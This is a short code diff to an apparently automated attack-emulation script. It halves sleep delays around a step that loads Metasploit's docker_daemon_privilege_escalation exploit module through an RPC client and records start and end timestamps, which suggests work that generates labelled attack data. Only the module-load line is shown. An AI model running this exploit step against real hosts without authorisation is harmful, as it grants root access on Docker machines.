@@ -23,7 +23,7 @@ def main(argv):
     # start 4
     output_time_file_start = 'time_step_4_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(120)
+    time.sleep(60)
 
     try:
         exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
@@ -38,10 +38,10 @@ def main(argv):
         print(e) 
         pass  
     
-    time.sleep(120)
+    time.sleep(60)
     output_time_file_end = 'time_step_4_end.txt'
     record_timestamp(folder, output_time_file_end)
-    time.sleep(120)
+    time.sleep(60)
 
 
 
